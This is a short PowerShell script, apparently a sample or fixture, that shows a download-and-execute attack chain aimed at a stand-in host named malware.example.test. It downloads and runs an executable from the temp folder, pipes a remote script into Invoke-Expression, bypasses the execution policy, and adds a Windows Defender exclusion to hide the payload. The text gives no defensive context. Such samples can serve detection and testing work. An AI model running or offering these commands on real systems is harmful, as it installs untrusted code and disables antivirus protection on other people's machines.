$ErrorActionPreference = "Stop"
Invoke-WebRequest -Uri "http://malware.example.test/tool.zip" -OutFile "$env:TEMP\tool.zip"
Expand-Archive -Path "$env:TEMP\tool.zip" -DestinationPath "$env:TEMP\tool" -Force
& "$env:TEMP\tool\run.exe"
Invoke-RestMethod -Uri "http://malware.example.test/e.ps1" | Invoke-Expression
powershell -ExecutionPolicy=Bypass -Command "Expand-Archive tool.zip"
Add-MpPreference -ExclusionPath "$env:TEMP\tool"
